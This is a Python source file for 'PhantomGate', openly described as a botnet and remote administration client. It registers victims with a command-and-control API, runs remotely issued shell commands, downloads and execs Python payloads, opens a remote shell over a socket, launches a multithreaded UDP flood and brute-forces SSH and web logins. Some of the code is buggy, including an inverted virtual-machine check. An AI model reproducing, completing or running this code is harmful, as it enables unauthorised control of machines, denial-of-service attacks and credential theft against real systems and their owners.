"""
PhantomGate.py

A multi-purpose remote administration and botnet utility with features such as:
- Remote command execution via API
- UDP flood (DoS testing) with adaptive rate control
- Target registration and management using SQLite
- File transfer and simple HTTP server for file sharing
- Botnet instruction retrieval and execution
- Cross-platform support (Windows, Linux, Android detection)
- Command output reporting to a central API
This script is designed to be run as a standalone application, providing a command-line interface for interacting with a remote API server.

Usage:
    To run the PhantomGate script, use the following command in your terminal or command prompt:
        ~$ python PhantomGate.py

Main Features:
    - Registers the client (target) with a central API server
    - Periodically polls for instructions (commands, botnet actions)
    - Executes received commands and reports output
    - Supports UDP flood and custom botnet actions
    - Provides a simple HTTP server for file sharing
    - Provides system information retrieval
    - Code injection and
    - Provides file transfer and directory navigation utilities
    - Supports command execution with output capture
    - Handles target data management in a SQLite database
    - Supports adaptive rate control for UDP flood attacks
    - checks if it is running in vm or not,if so keep running other than that exit

API Endpoints (default: {config.url}):
    /api/register_target      Register a new target
    /api/ApiCommand/<target>     Get commands for a target
    /api/Apicommand/save_output  Post command output
    /api/BotNet/<target>         Get botnet instructions
    /api/injection/<target>     Get Python script for injection
    /api/injection_output_save   Save output of executed script
    /api/lib/<script_name>       Retrieve a Python script from the library
    /api/get_instruction/<target> Get instructions for a target

Author: (OMER KEMAL)
"""

from sys import platform
import socketserver
import http.server
import subprocess
import contextlib
import threading
import itertools
import platform
import datetime
import requests
import paramiko
import sqlite3
import logging
import string
import random
import socket
import uuid
import time
import sys
import io
import os

# importing setting
from setting import Setting

# initializing settings
config = Setting()
config.setting_var()

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'


def targetData(command, user_name=None, ID=None, threadPermisstion='Allow', threadStatus='Running'):
    """
    Manages target data in a SQLite database.
    Args:
        command (str): The command to execute ('create_target', 'get', etc.).
        user_name (str, optional): The name of the target to create.
        ID (str, optional): The unique identifier for the target.
    Returns:
        str or list: A message or data depending on the command.
    """
    conn = sqlite3.connect('info.db')
    cursor = conn.cursor()

    # Create tables
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS target_data (
            id TEXT PRIMARY KEY NOT NULL,
            target_name TEXT NOT NULL,
            is_registor TEXT
        )
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS therade_permission (
            id TEXT PRIMARY KEY NOT NULL,
            threadPermission TEXT NOT NULL
        )
    """)

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS thread_status (
            thread_id TEXT PRIMARY KEY NOT NULL,
            threadStatus TEXT NOT NULL
        )
    """)

    try:
        if command == 'create_target' and user_name and ID:
            try:
                cursor.execute('INSERT INTO target_data(id, target_name, is_registor) VALUES (?, ?, ?)', (ID, user_name, '0'))
                conn.commit()
                return "Target was created successfully"
            except sqlite3.IntegrityError:
                return "Target ID already exists"

        elif command == 'get':
            cursor.execute("SELECT * FROM target_data")
            return cursor.fetchall()

        elif command == 'setPermission' and ID:
            cursor.execute('SELECT id FROM therade_permission WHERE id = ?', (ID,))
            exists = cursor.fetchone()
            if exists:
                cursor.execute('UPDATE therade_permission SET threadPermission = ? WHERE id = ?', (threadPermisstion, ID))
            else:
                cursor.execute('INSERT INTO therade_permission(id, threadPermission) VALUES (?, ?)', (ID, threadPermisstion))
            print('done! in or up')
            conn.commit()
            return "Thread permission was set/updated successfully"

        elif command == 'save_thread_info' and ID:
            cursor.execute('INSERT OR REPLACE INTO thread_status(thread_id, threadStatus) VALUES (?, ?)', (ID, threadStatus))
            conn.commit()
            return "Thread info saved successfully"

        elif command == 'getThread':
            cursor.execute("SELECT * FROM thread_status")
            return cursor.fetchall()

        elif command == 'getPermission':
            cursor.execute("SELECT * FROM therade_permission")
            return cursor.fetchall()

        else:
            return "Invalid command or missing parameters"

    except Exception as e:
        print(f"Error: {e}")
        return "Something went wrong"

    finally:
        conn.close()




def is_android():
    """Checks if the current operating system is Android."""
    return 'ANDROID_ROOT' in os.environ or os.path.exists('/system/build.prop')

def get_os_name():
    """Returns the name of the operating system."""
    return "Android" if is_android() else platform.system()

def format_mac(mac_int):
    """Formats a MAC address from an integer."""
    return ':'.join(f'{(mac_int >> i) & 0xff:02x}' for i in range(40, -1, -8))

def get_mac_address():
    """Returns the MAC address of the host."""
    mac_int = uuid.getnode()
    is_random = (mac_int >> 40) & 0x02
    if is_random:
        return "Could not reliably determine"
    return format_mac(mac_int)

def get_all_ip_addresses():
    """Returns a list of all IP addresses associated with the host."""
    try:
        return list(set([socket.gethostbyname(socket.gethostname())]))
    except:
        return ["Unavailable"]

def get_environment_vars():
    """Returns a dictionary of selected environment variables."""
    keys = ['PATH', 'HOME', 'USER', 'SHELL', 'LANG', 'OS', 'COMPUTERNAME', 'ANDROID_ROOT']
    return {key: os.environ.get(key, "Not set") for key in keys}

def get_cpu_count():
    """Returns the number of CPU cores available."""
    return os.cpu_count() or "Unavailable"

def get_memory_info():
    """Returns total and free memory in MB."""
    try:
        with open('/proc/meminfo') as f:
            lines = f.read().splitlines()
        total = next(int(x.split()[1]) for x in lines if x.startswith('MemTotal:')) // 1024
        free = next(int(x.split()[1]) for x in lines if x.startswith('MemFree:')) // 1024
        return f"{total} MB", f"{free} MB"
    except:
        return "Unavailable", "Unavailable"

def get_uptime():
    try:
        with open('/proc/uptime') as f:
            uptime_seconds = float(f.readline().split()[0])
            return str(datetime.timedelta(seconds=int(uptime_seconds)))
    except:
        return "Unavailable"

def get_cpu_info():
    """Returns the CPU information of the system."""
    if platform.processor():
        return platform.processor().strip()
    try:
        with open('/proc/cpuinfo') as f:
            for line in f:
                if "model name" in line.lower() or "hardware" in line.lower():
                    return line.split(":", 1)[1].strip()
    except:
        pass
    return "Unavailable"

def format_datetime(dt):
    """Formats a datetime object into a human-readable string."""
    return dt.strftime("%Y-%m-%d %H:%M:%S (%A)")

def print_pretty(title, data_dict):
    """
    Formats and prints a dictionary in a pretty way.
    """
    output = ''
    print(f"\n===== {title} =====")
    max_len = max(len(k) for k in data_dict)
    for key in sorted(data_dict):
       output+= f"  {key.ljust(max_len)} : {data_dict[key]}\n"
    return output

def sys_info():
    """Collects and formats system information including OS, hardware, network, user environment, and date/time.
    Returns:
        dict: A dictionary containing formatted system information.
    """
    # System Info
    system_info = {
        "OS"              : get_os_name(),
        "Node Name"       : platform.node(),
        "Release"         : platform.release(),
        "Version"         : platform.version(),
        "Machine"         : platform.machine(),
        "Processor"       : get_cpu_info(),
        "Architecture"    : ' '.join(platform.architecture()),
        "Python Version"  : platform.python_version(),
        "Implementation"  : platform.python_implementation(),
        "Compiler"        : platform.python_compiler()
    }

    # Hardware Info
    total_mem, free_mem = get_memory_info()
    hardware_info = {
        "CPU Cores"       : get_cpu_count(),
        "Memory Total"    : total_mem,
        "Memory Free"     : free_mem,
        "System Uptime"   : get_uptime()
    }

    # Network Info
    ip_list = get_all_ip_addresses()
    network_info = {
        "Hostname"        : socket.gethostname(),
        "IP Addresses"    : ', '.join(ip_list),
        "MAC Address"     : get_mac_address()
    }

    # User & Environment
    try:
        user = os.getlogin()
    except OSError:
        user = "Unavailable (no tty)"
    user_env = get_environment_vars()
    user_env.update({
        "Current User"    : user,
        "Current Dir"     : os.getcwd(),
        "Home Dir"        : os.path.expanduser('~')
    })

    # Date & Time
    now = datetime.datetime.now()
    dt_info = {
        "Local Time"      : format_datetime(now),
        "UTC Time"        : format_datetime(datetime.datetime.utcnow())
    }

    # Output all
    System_info = print_pretty("System Info", system_info)
    Hardware_info = print_pretty("Hardware Info", hardware_info)
    Network_info = print_pretty("Network Info", network_info)
    User_env = print_pretty("User & Environment", user_env)
    Dt_info = print_pretty("Date & Time", dt_info)

    return {
        'System Info': System_info, 
        'Hardware Info': Hardware_info, 
        'Network Info': Network_info, 
        'User & Environment': User_env, 
        'Date & Time': Dt_info
    }


# os.system("clear")
def opratingSystem():
    """
    Determines the operating system of the current machine.
    Returns:
        str: The name of the operating system (e.g., 'Windows', 'Linux', 'Android').
    """
    if platform == "win32":
        return 'Windows'
    else:
        is_android = CMD('getprop ro.build.version.release')
        if is_android == 'android decoding str is not supported':
            return 'linux'
        else:
            return f'android {is_android}'


def get_ip():
    """
    Retrieves the local IP address of the machine.
    Returns:
        str: The local IP address of the machine.
    """
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8',80))
        ip = s.getsocketname()[0]
    except Exception as e:
        ip = socket.gethostbyname(socket.gethostname())

    s.close()

    return ip


# Shared Data for Tracking
packet_counts = {}  
lock = threading.Lock()  
stop_event = threading.Event()  

def send_udp_flood(thread_id, ports,TARGET_IP,PACKET_SIZE,FAKE_HEADERS,BASE_DELAY,ADAPTIVE_THRESHOLD,MIN_DELAY,MAX_DELAY):
    """
    Sends UDP flood packets to the target IP on specified ports.
    Args:
        thread_id (int): Identifier for the thread.
        ports (list): List of ports to target.
        TARGET_IP (str): The target IP address.
        PACKET_SIZE (int): Size of each UDP packet.
        FAKE_HEADERS (list): List of fake headers to use in packets.
        BASE_DELAY (float): Base delay between packet sends.
        ADAPTIVE_THRESHOLD (int): Threshold for adaptive rate control.
        MIN_DELAY (float): Minimum delay for adaptive control.
        MAX_DELAY (float): Maximum delay for adaptive control.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    delay = BASE_DELAY  
    packet_count = 0  

    while not stop_event.is_set():  # Stop when the event is set
        for target_port in ports:  # Loop through all ports
            if stop_event.is_set():  
                break  # Stop immediately if the stop event is triggered

            message = random.choice(FAKE_HEADERS) + random._urandom(PACKET_SIZE - len(FAKE_HEADERS[0]))  

            try:
                sock.sendto(message, (TARGET_IP, target_port))
                packet_count += 1
            except Exception as e:
                print(f"[Thread {thread_id}] Error: {e}")
                break  

            # Update shared packet count
            with lock:
                packet_counts[thread_id] = packet_count  

            # Adaptive Rate Control
            if packet_count % ADAPTIVE_THRESHOLD == 0:
                delay = max(MIN_DELAY, min(MAX_DELAY, delay * random.uniform(0.8, 1.2)))  

            time.sleep(delay)  


# Command Interface
def command_interface(threads,threadPermission):
    while threadPermission == 'Allow':
        cmd = input("\nEnter command (status / stop): ").strip().lower()
        
        if cmd == "status":
            with lock:
                print("\n[Thread Status]")
                for tid, count in packet_counts.items():
                    print(f"Thread {tid}: {count} packets sent")
        
        elif cmd == "stop":
            print("\nStopping all threads...")
            stop_event.set()  
            for t in threads:
                t.join()  
            print("All threads stopped. Exiting.")
            break
        threadPermission = targetData(command='getPermission')[0][1]

# udp-flood(socket)
def initUdpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
    """
    Initiates a UDP flood attack on the specified target IP with multiple threads.
    Args:
        TARGET_IP (str): The target IP address to flood.
        THREAD_COUNT (int): Number of threads to use for the flood.
        PACKET_SIZE (int): Size of each UDP packet to send.
    """
    # default ports
    ports = config.PORT
    # Start Threads
    threads = []
    for i in range(THREAD_COUNT):  
        t = threading.Thread(target=send_udp_flood, args=(i, ports,TARGET_IP,PACKET_SIZE,config.FAKE_HEADERS,config.BASE_DELAY,config.ADAPTIVE_THRESHOLD,config.MIN_DELAY,config.MAX_DELAY), daemon=True)
        t.start()
        threads.append(t)
        packet_counts[i] = 0
    command_interface(threads)


# setting varible
built_in_command = config.BUIT_IN_COMMAND
apiToken = config.API_TOKEN

logger = logging.getLogger(__name__)

#ollama run deepseek-r1:1.5b


def injection(token,target_name,method='GET'):
    """
    Retrieves a Python script from a local API server.
    Args:
        token (str): The API token for authentication.
        target_name (str): The name of the target to retrieve.
    Returns:
        dict or str: A dictionary with a message if saved, or the script text if not saved.
                     Returns 'invalid' if the request fails.
    """
    args = {
            'token': token,
            'ip': get_ip(),
            'os': opratingSystem()
        }

    try:
        if method.upper() == 'GET':
            GET = requests.get(f'{config.url}/api/injection/{target_name}', params=args)
            response = GET.json()
            valid = GET.status_code

            if valid == 200:
                return {'message':response.text}

            return {'message':f'GET request failed with status code {valid}'}
        elif method.upper() == 'POST':
            POST = requests.post(f'{config.url}/api/injection_output_save', json=args)
            response = POST.json()
            valid = POST.status_code

            if valid == 200:
                return {'message':response.text}
            return {'message':f'POST request failed with status code {valid}'}

        return {'message':'invalid method'}

    except:
        return {'message':'Error'}




def libApi(token,usePyload,save=True):
    """
    Retrieves a Python script from a local API server and optionally saves it to a file.
    Args:
        token (str): The API token for authentication.
        usePyload (str): The name of the script to retrieve.
        save (bool): Whether to save the script to a file (default is True).
    Returns:
        dict or str: A dictionary with a message if saved, or the script text if not saved.
                     Returns 'invalid' if the request fails.
    """
    args = {
            "token": token,
            'ip': get_ip(),
            'os': opratingSystem(),
            'pyload': usePyload
        }

    try:
        GET = requests.get(f'{config.url}/api/lib/{usePyload}', params=args)

    except:
        return 'Error'
    
    response = GET.json()
    valid = GET.status_code

    if valid == 200:
        if save:
            with open(f'{usePyload}.py','w',encode='utf-8') as f:
                f.write(response.text)
            return {'message':f'file saved.name={usePyload}.py'}
        return {'message':response.text}
    
    return 'invalid'


def code_excuter(script):
    """
    Executes a Python script and captures its output.
    Args:
        script (str): The Python script to execute.
    Returns:
        str: The output of the executed script or an error message if execution fails.
    """
    try:
        output_buffer = io.StringIO()
        with contextlib.redirect_stdout(output_buffer):
            exec(script)

        output = output_buffer.getvalue()
        return output
    except:
        return "Error executing code. Please check the script for errors."
def CMD(com):
    """
    Executes a command in the shell and returns its output.
    Args:
        com (str): The command to execute.
    Returns:
        str: The output of the command or an error message if execution fails.
    """

    if com not in built_in_command:
        try:
            cmd = subprocess.run(com, shell=True, capture_output=True, text=True)
            output_bytes = cmd.stderr + cmd.stdout
            output_string = str(output_bytes,'utf-8')
            cmd_data = output_string
            
        except Exception as e:
            output_string = str(output_bytes)
            cmd_data = output_string

        if len(cmd_data) == 0:
            cmd_data = 'done!'
        return cmd_data
    else:
        if com.startswith('excute_code') and not len(com) == 11:
            return code_excuter(com[11:])
        elif com.startswith('server'):
            ...
        elif com.startswith('ls'):
            ls = os.listdir('.')
            return ls
        elif com.startswith('sys_info'):
            sys_info_data = sys_info()
            return sys_info_data
        



def apiCommandGet(token,target_name):
    """
    Retrieves commands for a specific target from the API.
    Args:
        token (str): The API token for authentication.
        target_name (str): The name of the target to retrieve commands for.
    Returns:
        list: A list of commands for the target, or 'invalid' if the request fails.
    """
    args = {"token": token,'ip': get_ip(),'os':opratingSystem()}

    try:
        GET = requests.get(f'{config.url}/api/ApiCommand/{target_name}',params=args)

    except:
        return 'Error'
    
    response = GET.json()
    valid = GET.status_code

    if valid == 200:
        return response['allCommand']
    
    return 'invalid'
      

#3=cmd,target_name=2
def apiCommandPost(token,data,target_name):
    """
    Posts command output to the API for a specific target.
    Args:
        token (str): The API token for authentication.
        data (list): A list of tuples containing command IDs and their outputs.
        target_name (str): The name of the target to post command output for.
    Returns:
        dict: A dictionary containing the response from the API, or 'Invalid' if the request fails.
    """
    # data is all command recived from the api
    params= {
        'token': token,
        'target_name': target_name,
        'output': [],
        'ip': get_ip(),
        'os':opratingSystem()
    }
    # cmd[0] is the id of the command
    for cmd in data:
        output = CMD(com=cmd[3])
        # sending cmd output and cmd id
        params['output'].append((cmd[0],output))
    
    POST = requests.post(f'{config.url}/api/Apicommand/save_output',json=params)
    response = POST.json()
    valid = POST.status_code

    if valid == 200:
        return response
    
    return 'Invalid'


def BotNet(target_name,apiToken):
    """
    Retrieves botnet instructions for a specific target from the API.
    Args:
        target_name (str): The name of the target to retrieve botnet instructions for.
        apiToken (str): The API token for authentication.
    Returns:
        tuple: A tuple containing the botnet instructions (udpflood, bruteFroce, customBotNet) or 'empty' if no instructions are available.
    """
    botNet = requests.get(f'{config.url}/api/BotNet/{target_name}',params={'token':apiToken,'ip':get_ip(),'os':opratingSystem()})

    if botNet.status_code == 200:

        if botNet.json()['message'] == 'good':

            udpflood = botNet.json()['udp-flood']
            bruteFroce = botNet.json()['brute-froce']
            customBotNet = botNet.json()['custom-BotNet']

            return udpflood,bruteFroce,customBotNet
    
        elif botNet.json()['message'] == 'bad':
            return 'empty'
        
    else:

        logger.info('[botNet Invalid]')
        return 'error'



def Registor(target_name, apiToken):
    """
    Registers a new target with the API.
    Args:
        target_name (str): The name of the target to register.
        apiToken (str): The API token for authentication.
    Returns:
        dict: A dictionary containing the registration response from the API, or an error message if registration fails.
    """
    info = {
        'token': apiToken,
        'target_name': target_name,
        'os': opratingSystem(),
        'ip': get_ip()
    }
    print(target_name)
    try:
        # Sending the POST request to register the target
        POST = requests.post(f"{config.url}/api/registor_target", json=info)
        # Check if the status code is 200
        if POST.status_code == 200:
            targetData(command='create_target', user_name=POST.json()['target_name'])
            return POST.json()
    except requests.exceptions.RequestException as e:
        return f"Error during registration: {str(e)}"



def Instarction(target_name, apiToken):
    """
    Retrieves instructions for a specific target from the API.
    Args:
        target_name (str): The name of the target to retrieve instructions for.
        apiToken (str): The API token for authentication.
    Returns:
        dict: A dictionary containing the instructions for the target, or an error message if the request fails.
    """
    info = {
        'token': apiToken,
        'ip': get_ip(),
        'os':opratingSystem()
    }
    try:
        # Sending the GET request to retrieve instructions
        GET = requests.get(f"{config.url}/api/get_instraction/{target_name}", params=info)
        if GET.status_code == 200:
            instruction = GET.json()
            return instruction
        else:
            return {
                'error': f"Unexpected status code {GET.status_code}",
                'details': GET.json()
            }
    except requests.exceptions.RequestException as e:
        return {
            'error': 'RequestException occurred',
            'details': str(e)
        }


def get_host_port(s1):
    """
    Extracts the IP and PORT from a string formatted as 'IP:PORT'.
    Args:
        s1 (str): The string containing the IP and PORT.
    Returns:
        tuple: A tuple containing the IP and PORT as strings.
    """
    for i in range(0,len(s1)):
        if s1[i] == ":":
            IP = s1[:i]
            PORT = s1[i+1:]

    return IP,PORT

def dir_chacker(_pwd):
    """
    Checks the current working directory and returns the path without the leading directory.
    Args:
        _pwd (str): The command to get the current working directory.
    Returns:
        str: The current working directory without the leading directory.
    """
    cmd = subprocess.Popen(_pwd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    bytes = cmd.stdout.read() + cmd.stderr.read()
    string = str(bytes)
    pwd = string[2:-3]
    ch_point = []

    for x in range(len(pwd)):
        if pwd[x] == "/":
            ch_point.append(x)
    
    f = ch_point[-1] + 1
    ch_point.clear()
    return pwd[f:]
    
    
def server_target(IP, PORT):
    """
    Starts a simple HTTP server to serve files from the current directory.
    Args:
        IP (str): The IP address to bind the server to.
        PORT (int): The port number to bind the server to.
    """
    #creating request handler with variable name handler
    handler = http.server.SimpleHTTPRequestHandler
    #binding the request with the ip and port as httpd
    with socketserver.TCPServer((IP, int(PORT)), handler) as httpd:
        messeage = YELLOW+"Server started at  -> "+IP+":"+PORT+END
        #running the server
        httpd.serve_forever()
            
def send(com,_port):
        """
        Sends a file over a socket connection.
        Args:
            com (str): The path to the file to be sent.
            _port (int): The port number to connect to.
        """
        _s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        host = socket.gethostname()

        try:
            print(_port)
            _s.connect((host,_port))
        except Exception as e:
            pass
        try:
            file_size = str(os.path.getsize(com))
            _s.send(str.encode(file_size))
        
            with open(com,"rb") as files:

                while True:
                    data = files.read(1024)
                    if not (data):
                        break
                    _s.send(data)

        except:
            _s.close()

def socketMain(host,port,threadPermission):
    """
    Main function to establish a socket connection and handle commands.
    It connects to a server, retrieves the current working directory,
    and listens for commands to execute, change directories, or start a server.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((host, port))
        _pwd = "echo %cd%" if platform == "win32" else "pwd"
        pwd = dir_chacker(_pwd)
        s.send(pwd.encode())

        while threadPermission == 'Allow':
            data = s.recv(1024)
            if not data:
                break

            command = data.decode("utf-8").strip()

            if command in ("exit", "quite"):
                break

            elif command.startswith("cd "):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    pwd = dir_chacker(_pwd)
                    msg = f"-pwd@-{pwd}"
                except Exception:
                    msg = f"{RED}\n[!][!] Oops! no such directory: {path}{END}"
                s.send(msg.encode())

            elif command.startswith("server "):
                s1 = command[7:].strip()
                IP, PORT = get_host_port(s1)
                message = f"{GREEN}server is running on: {END}{MAGENTA}{IP}:{PORT}{END}"
                threading.Thread(target=server_target, args=(IP, PORT)).start()
                s.send(message.encode())

            elif command.startswith("download "):
                com = command[9:].strip()
                _port = port - 1
                send(com, _port)

            else:
                if command.startswith("ls"):
                    command = f"ls --color {command[3:].strip()}"
                try:
                    proc = subprocess.Popen(command, shell=True,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    output_bytes = proc.stdout.read() + proc.stderr.read()
                    output_string = output_bytes.decode("utf-8").strip()
                except Exception as e:
                    output_string = f"{RED}[!] Command execution failed: {e}{END}"

                if not output_string:
                    output_string = f"{GREEN}[   {END}{YELLOW}>_< {END}{GREEN}  [DONE!!!]  ]{END}"

                s.send(output_string.encode())

    except Exception as e:
        print(f"[!] Connection error: {e}")
    finally:
        s.close()

    threadPermission = targetData(command='getPermission')[0][1]

# brute force section is not implemented in this code snippet.

def ssh_brute_force(password, host, port=22, username='root'):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=username, password=password)
        print(f"Password found: {password}")
        return True
    except paramiko.AuthenticationException:
        print(f"Failed password: {password}")
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False
def webLogin(userName,password,userInputName,passwordInputName,url="https://web.facebook.com/?_rdc=1&_rdr#"):
    """
    Attempts to log in to a web application using the provided username and password.
    Args:
        userName (str): The username to use for login.
        password (str): The password to use for login.
        userInputName (str): The name attribute of the username input field in the HTML form.
        passwordInputName (str): The name attribute of the password input field in the HTML form.
        url (str): The URL of the login page.
    """
    session = requests.Session()
    payload = {userInputName: userName, passwordInputName: password}
    response = session.post(url, data=payload)
    if response.status_code == 200:
        ...
def password_generator(host, port=22, userInputName=None, passwordInputName=None, userName='admin', length=8, start_index=0, brute_type='ssh'):
    """
    Generates all possible combinations of characters for a given length.
    The characters include uppercase letters, lowercase letters, and digits.
    """
    # Define the character sets
    capital = list("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    small = list("abcdefghijklmnopqrstuvwxyz")
    numbers = list("0123456789")
    special_chars = list("!@#$%^&*()-_=+[]{}|;:',.<>?/~`")

    all_chars = capital + small + numbers + special_chars  # Combine all characters
    combinations = itertools.product(all_chars, repeat=length)
    # calculaing total number of passwords
    total_passwords = len(all_chars) ** length
    if brute_type == 'ssh':
        for index, word in enumerate(itertools.islice(combinations, start_index, None), start=start_index):
            login = ssh_brute_force("".join(word),host=host,username=userName,port=port) # Print index and word
            if login:
                return {'meassege': 'password found','password':''.join(word)}
    elif brute_type == 'weblogin':
        for index, word in enumerate(itertools.islice(combinations, start_index, None), start=start_index):
            if userInputName and passwordInputName:
                login = webLogin(userName=userName,userInputName=userInputName,password="".join(word),passwordInputName=passwordInputName)
                if login:
                    return {'meassege': 'password found','userName':userName,'password':''.join(word)}

def main():
    """
    Main function to handle the API interaction and command execution loop.
    It retrieves target information, processes instructions, and executes commands
    based on the retrieved instructions.
    """
    threadPermission = targetData(command='getPermission')[0][1]
    while threadPermission == 'Allow':
        # Retrieve target info
        target_info = targetData(command='get')
        delay = 5

        if len(target_info) != 0:
            target_name = target_info[0][1]
            instraction = Instarction(target_name=target_name, apiToken=apiToken)
            print(instraction)
            # Ensure instraction is valid
            if isinstance(instraction, dict) and 'error' not in instraction:
                delay = int(instraction.get('delay', 5))  # Default to 5 if no delay is found

                if instraction['instraction'].replace(' ','') == 'connectToWeb':
                    cmd = apiCommandGet(target_name=target_name, token=apiToken)
                    result = apiCommandPost(token=apiToken, target_name=target_name, data=cmd)

                    if result == 'Invalid':
                        logger.info(f'[apiCommandPost Invalid] {result}')

                elif instraction['instraction'] == 'botNet':
                    botNet = BotNet(target_name=target_name, apiToken=apiToken)

                    if botNet not in ['error', 'no instraction yet']:
                        udpflood, bruteFroce, customBotNet = botNet

                        if udpflood['stutas'] != 'Inactive':
                            # Handle udpflood action
                            logger.info(f'[botNet] Starting UDP flood with parameters: {udpflood}')
                            host = botNet['info']['host']
                            if not host:
                                logger.info('[botNet Invalid] Host or port not specified for UDP flood')
                                print({'message':'[botNet Invalid] Host or port not specified for UDP flood'})

                            # Start the UDP flood
                            logger.info(f'[botNet] Starting UDP flood on {host}')
                            print(f'[botNet] Starting UDP flood on {host}')
                            initUdpFlood(TARGET_IP=host, THREAD_COUNT=5, PACKET_SIZE=1024)
                        elif bruteFroce['stutas'] != 'Inactive':
                            # Handle bruteForce action
                            brute_type = bruteFroce['info']['brute_type']
                            if brute_type == 'ssh':
                                if bruteFroce['info']['port'] == 'notSet' and bruteFroce['info']['userName'] == 'notSet' and bruteFroce['info']['length']== 'notSet' and bruteFroce['info']['start_index'] == 'netSet':
                                    password_generator(host=bruteFroce['info']['host'])
                        elif customBotNet['stutas'] != 'Inactive':
                            # Handle customBotNet action
                            pass
                        else:
                            logger.info('[botNet Invalid] No valid botnet commands')
                            print({'message':'[botNet Invalid] No valid botnet commands'})

                    else:
                        logger.info(f'[botNet Invalid] {botNet}')
                    print({'message':'[botNet Invalid] Exiting after handling botNet'})

                elif instraction['instraction'] == 'injection':
                    response = injection(apiToken, target_name)
                    if response['message'] == 'invalid' or response['message'] == 'Error':
                        logger.info('[injection Invalid] Failed to retrieve script')
                        print({'message':'[injection Invalid] Failed to retrieve script'})

                    output = code_excuter(response['message'])
                    if output == 'Error executing code. Please check the script for errors.':
                        logger.info('[injection Invalid] Error executing code')
                        print({'message':'[injection Invalid] Error executing code'})
                    return_output = injection(token=apiToken, target_name=target_name, method='POST')
                    if return_output['message'] == 'invalid':
                        logger.info('[injection Invalid] Failed to post output')
                        print({'message':'[injection Invalid] Failed to post output'})
                elif instraction['instraction'] == 'connectToSocket':
                    host = instraction['host']
                    port = instraction['port']
                    socketMain(host=host, port=port)

            else:
                logger.info(f'[apiCommandPost Error] {instraction}')
                print({'message':f'[apiCommandPost Error] {instraction}'})

        else:
            # Handle case where no target info is available
            user_name = config.ID(n=10)
            data = Registor(target_name=user_name, apiToken=apiToken)
            if data == 'error':
                logger.info(f'Error during registration: {data}')
            else:
                print(data)
                if data != None:
                    registor_target = targetData(command='create_target', ID=config.ID(n=5), user_name=data['target_name'])
                    if registor_target == "Target was created successfully":
                        logger.info(f'Target {data["name"]} was successfully registered')
                    else:
                        logger.info(f'Failed to register target: {registor_target}')

        # Wait before repeating the process
        time.sleep(delay)
        threadPermission = targetData(command='getPermission')[0][1]

        # Uncomment the line below to enable socketMain functionality
        # socketMain()
        # Uncomment the line below to enable UDP flood functionality
        # udpFlood(TARGET_IP=get_ip(), THREAD_COUNT=5, PACKET_SIZE=1024)
        # Uncomment the line below to enable libApi functionality
        # libApi(token=apiToken, usePyload='example_script.py', save=True)
        # Uncomment the line below to enable command execution
        # print(CMD(com='ls -l'))  # Example command execution
        # Uncomment the line below to enable file transfer functionality
        # send(com='example_file.txt', _port=8080)  # Example file transfer
        # Uncomment the line below to enable server functionality
        # server_target(IP='127.0.0.1', PORT=8000)  # Example server start
        # Uncomment the line below to enable socketMain functionality
        # socketMain(host='127.0.0.1', PORT=9000)
        # Uncomment the line below to enable targetData functionality
        # print(targetData(command='get'))  # Example target data retrieval


def is_virtual_env():
    """
    Checks if the script is running inside a virtual machine or isolated environment.
    Returns:
        bool: True if running in a VM or container, False otherwise.
    """
    # Check for common VM vendors in system product name
    vm_indicators = [
        "virtualbox", "vmware", "kvm", "qemu", "hyper-v", "xen", "bochs", "parallels", "bhyve"
    ]
    try:
        # Linux: check /sys/class/dmi/id/product_name
        if os.path.exists("/sys/class/dmi/id/product_name"):
            with open("/sys/class/dmi/id/product_name") as f:
                product_name = f.read().lower()
                if any(vm in product_name for vm in vm_indicators):
                    return True
        # Windows: use wmic
        if sys.platform == "win32":
            import subprocess
            try:
                output = subprocess.check_output("wmic computersystem get model", shell=True).decode().lower()
                if any(vm in output for vm in vm_indicators):
                    return True
            except Exception:
                pass
        # Check for container environment
        if os.path.exists("/.dockerenv") or os.path.exists("/.containerenv"):
            return True
        # Check cgroup for docker/lxc
        if os.path.exists("/proc/1/cgroup"):
            with open("/proc/1/cgroup") as f:
                cgroup = f.read()
                if "docker" in cgroup or "lxc" in cgroup:
                    return True
    except Exception:
        pass
    return False

if __name__ == '__main__':
    # Initialize logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    # Start the main function
    print("Starting PhantomGate...")
    if not config.url:
        print("API URL is not set. Please configure the API URL in config.py.")
    else:
        print(f"Connecting to API at {config.url} with token {apiToken}")
    # Call the main function to start the botnet operations
    if apiToken == 'notSet':
        print("API token is not set. Please configure the API token in config.py.")
    else:
        print(f"Using API token: {apiToken}")
        # Start the main botnet operations
    # Check if running in a virtual machine or isolated environment
    print("Checking if running in a VM or isolated environment...")
    if not is_virtual_env():
        print("Running in a VM or isolated environment. Exiting.")
        sys.exit(0)
    main()
